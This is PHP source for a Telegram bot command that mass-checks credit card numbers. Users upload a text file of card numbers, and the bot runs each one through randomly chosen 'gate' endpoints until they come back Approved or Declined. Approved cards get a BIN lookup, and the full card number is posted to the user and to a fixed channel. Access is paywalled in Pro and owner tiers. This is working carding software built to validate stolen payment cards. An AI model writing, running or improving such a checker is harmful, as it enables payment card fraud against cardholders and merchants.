<?php
/* ========= CONFIG ========= */
$approvedtarget = -1003567663189; // channel / group id
date_default_timezone_set("Asia/Kolkata");

/* ========= CONTEXT ========= */
$cb  = $update["callback_query"] ?? null;
$msg = $update["message"] ?? null;

if ($msg) {
    $chatId = $msg["chat"]["id"];
    $userId = $msg["from"]["id"];
    $user   = $msg["from"];
}
elseif ($cb) {
    $chatId = $cb["message"]["chat"]["id"];
    $userId = $cb["from"]["id"];
    $user   = $cb["from"];   // ✅ FIXED
}
else {
    exit;
}

/* ========= USER ========= */
syncUser($user);
$dbUser = refreshRole(getUser($userId));
$role   = $dbUser["role"] ?? "free";

/* ========= FREE BLOCK ========= */
if ($role === "free") {
    tg("sendMessage", [
        "chat_id"=>$chatId,
        "parse_mode"=>"HTML",
        "text"=>"🔒 <b>Mass checker is Pro only</b>\nUse /redeem to upgrade."
    ]);
    exit;
}

/* ========= PRO COOLDOWN (5 MIN) ========= */
$cooldownFile = __DIR__."/tmp/mtxt_cd_$userId.json";

if ($role === "pro") {

    if (file_exists($cooldownFile)) {
        $last = json_decode(file_get_contents($cooldownFile), true);
        $remain = 300 - (time() - ($last["time"] ?? 0));

        if ($remain > 0) {
            tg("sendMessage", [
                "chat_id"=>$chatId,
                "parse_mode"=>"HTML",
                "text"=>"⏳ <b>Cooldown Active</b>\n\n".
                        "Please wait <b>{$remain}s</b> before using /mtxt again."
            ]);
            exit;
        }
    }
}

/* ========= STATE ========= */
$stateDir  = __DIR__ . "/tmp";
@mkdir($stateDir, 0755, true);
$stateFile = "$stateDir/mtxt_$userId.json";

/* ========= HELP ========= */
if ($msg && isset($msg["text"]) && preg_match('~^[/\.]mtxt$~i', trim($msg["text"]))) {

    tg("sendMessage", [
        "chat_id"=>$chatId,
        "parse_mode"=>"HTML",
        "text" =>
"<b>𝙃𝙤𝙬 𝙏𝙤 𝙐𝙨𝙚 /𝙢𝙩𝙭𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 🍳</b>\n\n".
"1️⃣ 𝙐𝙥𝙡𝙤𝙖𝙙 𝙖𝙣𝙮 𝙛𝙞𝙡𝙚 𝙞𝙣 <b>.txt</b> 𝙛𝙤𝙧𝙢𝙖𝙩 💎\n\n".
"2️⃣ 𝘽𝙤𝙩 𝘼𝙪𝙩𝙤 𝘿𝙚𝙩𝙚𝙘𝙩 𝙔𝙤𝙪𝙧 𝙁𝙞𝙡𝙚\n".
"   𝘼𝙣𝙙 𝙎𝙚𝙣𝙙 𝙔𝙤𝙪 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 😎\n\n".
"3️⃣ 𝙏𝙝𝙖𝙣 𝘾𝙡𝙞𝙘𝙠 𝙊𝙣\n".
"<b>𝘾𝙝𝙚𝙘𝙠 𝘾𝙖𝙧𝙙𝙨</b> 𝘽𝙪𝙩𝙩𝙤𝙣 ⏳\n\n".
"<i>Developed by</i> @ERRORxFF"
    ]);
    exit;
}

/* ========= STATUS BUTTONS ========= */
function mtxtStatusButtons($role, $checked, $total, $approved, $declined) {
    return [
        "inline_keyboard" => [
            [["text"=>"👤 ROLE : $role", "callback_data"=>"noop"]],
            [["text"=>"🔄 CHECKING : $checked / $total", "callback_data"=>"noop"]],
            [["text"=>"✅ APPROVED : $approved", "callback_data"=>"noop"]],
            [["text"=>"❌ DECLINED : $declined", "callback_data"=>"noop"]],
            [["text"=>"❌ CANCEL", "callback_data"=>"mtxt_cancel"]]
        ]
    ];
}

/* ========= FILE UPLOAD ========= */
if ($msg && isset($msg["document"])) {

    $file = tg("getFile", ["file_id"=>$msg["document"]["file_id"]]);
    $path = $file["result"]["file_path"] ?? null;

    $content = file_get_contents("https://api.telegram.org/file/bot{$TOKEN}/{$path}");
    $ccs = array_values(array_filter(array_map("trim", explode("\n", $content))));
    $filename = h($msg["document"]["file_name"] ?? "unknown.txt");

    file_put_contents($stateFile, json_encode([
        "ccs"=>$ccs,
        "index"=>0,
        "approved"=>0,
        "declined"=>0,
        "start"=>microtime(true),
        "stop"=>false
    ]));

    tg("sendMessage", [
        "chat_id"=>$chatId,
        "parse_mode"=>"HTML",
        "text" =>
"📄 <b>TXT FILE DETECTED</b>\n\n".
"• <b>File:</b> {$filename}\n".
"• <b>CCs Found:</b> ".count($ccs)."\n\n".
"<b>Do you want to start checking?</b>",
        "reply_markup"=>[
            "inline_keyboard"=>[
                [
                    ["text"=>"✅ Approve","callback_data"=>"mtxt_start"],
                    ["text"=>"❌ Cancel","callback_data"=>"mtxt_cancel"]
                ]
            ]
        ]
    ]);
    exit;
}

/* ========= CALLBACK ========= */
if ($cb) {

    tg("answerCallbackQuery", ["callback_query_id"=>$cb["id"]]);
    $data  = $cb["data"];
    $msgId = $cb["message"]["message_id"];

    /* ===== CANCEL ===== */
    if ($data === "mtxt_cancel" && file_exists($stateFile)) {

        $s = json_decode(file_get_contents($stateFile), true);
        $s["stop"] = true;
        file_put_contents($stateFile, json_encode($s));

        $time = round(microtime(true) - $s["start"], 2);

        tg("editMessageText", [
            "chat_id"=>$chatId,
            "message_id"=>$msgId,
            "parse_mode"=>"HTML",
            "text" =>
"🛑 <b>CHECK STOPPED BY USER</b>\n\n".
"📊 Partial Results:\n".
"✅ Approved: {$s['approved']}\n".
"❌ Declined: {$s['declined']}\n".
"🔢 Checked: ".($s['approved'] + $s['declined'])."\n".
"⏱️ Time: {$time}s\n\n".
"⚡ Process terminated successfully!"
        ]);
        exit;
    }

    /* ===== START ===== */
    if ($data === "mtxt_start" && file_exists($stateFile)) {

        $s = json_decode(file_get_contents($stateFile), true);
        $ccs = $s["ccs"];
        $total = count($ccs);

        for ($i = $s["index"]; $i < $total; $i++) {

            $s = json_decode(file_get_contents($stateFile), true);
            if (!empty($s["stop"])) break;

            $cc = $ccs[$i];
            $s["index"]++;
            file_put_contents($stateFile, json_encode($s));

            tg("editMessageText", [
                "chat_id"=>$chatId,
                "message_id"=>$msgId,
                "parse_mode"=>"HTML",
                "text" =>
"🚀 <b>Mass CC Check Started!</b>\n\n".
"👤 <b>Role :</b> ".($role==="owner"?"OWNER 👑":"PRO 💎")."\n".
"📊 <b>Total :</b> {$total}\n".
"🔄 <b>Checking :</b> {$s['index']} / {$total}\n".
"✅ <b>Approved :</b> {$s['approved']}\n".
"❌ <b>Declined :</b> {$s['declined']}",
                "reply_markup"=>mtxtStatusButtons(
                    $role==="owner"?"OWNER 👑":"PRO 💎",
                    $s["index"],
                    $total,
                    $s["approved"],
                    $s["declined"]
                )
            ]);

/* ========= GATE LIMIT ========= */
$limit = ($role === "owner") ? 99 : 2;

$gates = $pdo->query(
    "SELECT * FROM gates WHERE status='active' ORDER BY RAND() LIMIT {$limit}"
)->fetchAll();

$gate = $gates[array_rand($gates)];

            $start = microtime(true);
            $apiResult = @json_decode(@file_get_contents($gate["endpoint"].urlencode($cc)), true);
// ✅ COUNT THIS CHECK (GLOBAL + TODAY)
             addCheck($userId);
             
            if (($apiResult["Status"] ?? "") === "Approved") {

                $s["approved"]++;

                $bin6 = substr($cc, 0, 6);
                $binJson = @file_get_contents("https://bins.antipublic.cc/bins/$bin6");
                $binData = $binJson ? json_decode($binJson, true) : [];

                $bank    = h($binData["bank"] ?? "N/A");
                $type    = h(trim(($binData["type"] ?? "") . " " . ($binData["brand"] ?? "")));
                $country = h($binData["country_name"] ?? "N/A");

                $checkerUser = "<a href='tg://openmessage?user_id={$chatId}'>".h($user["first_name"])."</a>";
                $took = number_format(microtime(true) - $start, 2);
                $timeNow = date("h:i:s A");
$final =
"<b>MASS CHECK RESULT</b>\n\n".
"<b>[π] Card –</b> <code>{$cc}</code>\n".
"<b>[π] Status –</b> <code>Approved ✅</code>\n".
"<b>[π] Gateway –</b> <code>{$gate['name']}</code>\n".
"<b>[π] Response –</b> <code>".h($apiResult['Response'] ?? 'Approved')."</code>\n".
"<b>[π] Bin –</b> <code>{$bin6}</code>\n".
"<b>[π] Issuer –</b> <code>{$bank}</code>\n".
"<b>[π] Info –</b> <code>{$type}</code>\n".
"<b>[π] Country –</b> <code>{$country}</code>\n".
"<b>[π] Checked by –</b> {$checkerUser}\n".
"<b>[π] Took Time –</b> <code>{$took}s</code>\n\n".
"<i>Developed by @ERRORxFF</i>\n".
"<i>© {$timeNow}</i>";
                

                tg("sendMessage", ["chat_id"=>$chatId,"parse_mode"=>"HTML","text"=>$final]);
                tg("sendMessage", ["chat_id"=>$approvedtarget,"parse_mode"=>"HTML","text"=>$final]);

            } else {
                $s["declined"]++;
            }

            file_put_contents($stateFile, json_encode($s));
            usleep(400000);
        }

        $time = round(microtime(true) - $s["start"], 2);
        @unlink($stateFile);

        tg("editMessageText", [
            "chat_id"=>$chatId,
            "message_id"=>$msgId,
            "parse_mode"=>"HTML",
            "text" =>
"✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙! 𝙎𝙀𝙭'𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙮\n\n".
"├📊 𝙎𝙏𝘼𝙏𝙐𝙎\n".
"├☑️ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ➜ {$s['approved']}\n".
"├❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➜ {$s['declined']}\n".
"├💀 𝙏𝙤𝙩𝙖𝙡 ➜ {$total}\n".
"├⏱️ Time: {$time}s\n\n".
"⚡ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚☑️"
        ]);
        
        /* ========= SAVE COOLDOWN ========= */
if ($role === "pro") {
    file_put_contents($cooldownFile, json_encode([
        "time" => time()
    ]));
}
        
        exit;
    }
}